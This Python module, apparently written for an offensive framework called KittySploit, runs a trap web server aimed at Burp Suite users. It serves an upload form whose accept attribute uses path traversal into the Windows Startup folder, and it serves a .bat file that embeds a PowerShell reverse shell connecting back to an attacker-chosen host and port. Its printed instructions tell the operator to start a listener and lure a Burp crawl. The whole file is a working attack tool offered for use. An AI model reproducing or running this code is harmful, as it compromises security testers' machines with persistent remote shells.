#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import html
import importlib
import time
from datetime import datetime

from kittysploit import *
from lib.protocols.http.http_server import Http_server


class Module(Auxiliary, Http_server):

    __info__ = {
        "name": "Burp Crawler Accept Path Traversal Trap",
        "description": (
            "Serves a malicious HTML upload form whose file input accept attribute "
            "contains path traversal into the Windows Startup folder. The trap also "
            "serves a .bat embedding a PowerShell reverse shell. When Burp Suite "
            "Scanner crawls the page, its headless Chromium may drop the .bat on "
            "the operator's machine for persistence."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "references": [
            "https://portswigger.net/burp/documentation/scanner/crawling",
        ],
        "tags": ["burp", "crawler", "path-traversal", "file-upload", "trap", "server", "reverse-shell"],
    }

    lhost = OptIP("127.0.0.1", "Reverse shell connect-back address", required=True)
    lport = OptPort(4444, "Reverse shell connect-back port", required=True)

    startup_filename = OptString("burp_rs.bat","Target filename dropped in the Windows Startup folder",required=False)
    upload_action = OptString("/upload", "Form action path (POST handler)", required=False)
    page_title = OptString("Upload", "HTML page title", required=False)
    log_uploads = OptBool(True, "Log multipart POST submissions from crawlers", required=False)

    def _resolve_startup_filename(self) -> str:
        return str(self.startup_filename).strip() or "burp_rs.bat"

    def _resolve_accept_path(self) -> str:

        filename = self._resolve_startup_filename()
        return (
            "./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
            f"{filename}"
        )

    def _generate_bat_content(self) -> str:
        lhost_val = str(self.lhost).strip()
        lport_val = int(self.lport)

        pl_mod = importlib.import_module(
            "modules.payloads.singles.cmd.windows.powershell_reverse_tcp"
        )
        pl = pl_mod.Module(framework=getattr(self, "framework", None))
        pl.set_option("lhost", lhost_val)
        pl.set_option("lport", str(lport_val))
        ps_cmd = pl.generate()
        if not ps_cmd or not isinstance(ps_cmd, str):
            raise ValueError("PowerShell payload did not return a command string")

        return f"@echo off\r\n{ps_cmd.strip()}\r\n"

    def _build_html(self, file_value: str) -> str:
        action = html.escape(str(self.upload_action).strip() or "/upload")
        file_value = html.escape(file_value)
        accept_path = html.escape(self._resolve_accept_path())
        title = html.escape(str(self.page_title).strip() or "Upload")

        return f"""<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>{title}</title>
  </head>
  <body>
    <form action="{action}" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="{file_value}"
        accept="{accept_path}">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
"""

    def _log_event(self, message: str) -> None:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print_status(f"[{timestamp}] {message}")

    def run(self):
        startup_name = self._resolve_startup_filename()
        try:
            bat_content = self._generate_bat_content()
        except Exception as e:
            print_error(f"Failed to generate reverse shell .bat: {e}")
            return False

        bat_bytes = bat_content.encode("utf-8")
        trap_html = self._build_html(startup_name)
        upload_path = str(self.upload_action).strip() or "/upload"
        if not upload_path.startswith("/"):
            upload_path = f"/{upload_path}"
        bat_url_path = f"/{startup_name}"

        module = self

        def do_get(handler):
            if handler.path in ("/", "/index.html"):
                handler.send_response(200)
                handler.send_header("Content-type", "text/html; charset=utf-8")
                handler.end_headers()
                handler.write_response(trap_html.encode("utf-8"))
                module._log_event(f"Trap page served to {handler.client_address[0]} ({handler.path})")
                return

            if handler.path == bat_url_path or handler.path.endswith(startup_name):
                handler.send_response(200)
                handler.send_header("Content-type", "application/octet-stream")
                handler.send_header(
                    "Content-Disposition",
                    f'attachment; filename="{startup_name}"',
                )
                handler.end_headers()
                handler.write_response(bat_bytes)
                module._log_event(f"Payload .bat served to {handler.client_address[0]}")
                return

            handler.send_response(404)
            handler.send_header("Content-type", "text/plain; charset=utf-8")
            handler.end_headers()
            handler.write_response(b"404 Not Found")

        def do_post(handler):
            if handler.path == upload_path or handler.path.rstrip("/") == upload_path.rstrip("/"):
                body = b""
                try:
                    body = handler.get_post_data()
                except Exception:
                    pass

                if module.log_uploads:
                    size = len(body)
                    module._log_event(
                        f"Crawler form POST from {handler.client_address[0]} "
                        f"({handler.path}, {size} bytes)"
                    )
                    if size and size < 4096:
                        preview = body[:256].decode("utf-8", errors="replace")
                        print_debug(f"POST preview: {preview}")

                handler.send_response(200)
                handler.send_header("Content-type", "text/plain; charset=utf-8")
                handler.end_headers()
                handler.write_response(b"OK")
                return

            handler.send_response(404)
            handler.send_header("Content-type", "text/plain; charset=utf-8")
            handler.end_headers()
            handler.write_response(b"404 Not Found")

        bind_host = str(self.srvhost).strip() or "0.0.0.0"
        bind_port = int(self.srvport) if self.srvport else 8888
        display_host = "127.0.0.1" if bind_host in ("0.0.0.0", "::") else bind_host
        trap_url = f"http://{display_host}:{bind_port}/"
        payload_url = f"http://{display_host}:{bind_port}{bat_url_path}"

        print_info("Burp crawler accept-traversal trap (reverse shell)")
        print_info(f"Startup target: {startup_name}")
        print_info(f"Accept path: {self._resolve_accept_path()}")
        print_info(f"Reverse shell: {self.lhost}:{self.lport}")
        print_info(f"Payload .bat URL: {payload_url}")
        print_warning(
            "This targets the machine running Burp Suite (the scanner operator), "
            "not the scanned web application."
        )
        print_info("Start a listener before crawling, e.g.:")
        print_info("  use listeners/multi/reverse_tcp")
        print_info(f"  set lhost {self.lhost}")
        print_info(f"  set lport {self.lport}")
        print_info("  run")
        print_info(f"Add to Burp scan scope and crawl: {trap_url}")
        print_info("Press Ctrl+C to stop the server.")

        httpd = None
        try:
            httpd = self.listen_http({"GET": do_get, "POST": do_post}, forever=True, background=False)
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("Stopping trap server...")
        finally:
            if httpd:
                try:
                    httpd.shutdown()
                except Exception:
                    pass
            print_success("Trap server stopped.")
        return True
